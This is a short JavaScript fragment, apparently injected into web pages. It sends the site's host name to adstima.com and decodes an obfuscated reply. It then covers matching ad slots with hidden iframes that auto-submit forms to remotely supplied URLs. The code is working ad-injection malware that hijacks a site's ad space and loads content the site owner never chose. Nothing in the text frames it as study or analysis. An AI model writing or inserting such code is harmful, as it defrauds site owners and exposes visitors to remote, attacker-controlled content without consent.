...
$.post("http://adstima.com/bg/94YIzvPPuszyD69ykV0p0Ajqm3AR4EudClm7EM2etWI.js",
{
	dm: location.host
},
function(data,status){
	data = data.substring(0,2) + data.substring(3);
	var decodedData = window.atob(data);
	var myData = JSON.parse(decodedData);
	for (i=0; i<myData.length; i++){
		var e = $(myData[i].ptn);
		if (e.width() == myData[i].w && e.height() == myData[i].h){
			var szHtml = '<div style="width:300px; height:250px; display: table; position: relative; margin-top: -250px;">';
			szHtml += '<form id="adstima' + i + '" target="adsgIf' + i + '" action="' + myData[i].url + '" method="post" style="display:none"></form>';
			szHtml += '<iframe src="" name="adsgIf' + i + '" scrolling="no" style="border: 0px;display: block;overflow: hidden;position: relative;width: 300px;height: 250px;margin: 0;padding: 0;"></iframe>';
			szHtml += 	'</div>';
			$(myData[i].ptn).append(szHtml);
			$('#adstima' + i).submit();	
		}
	}
});
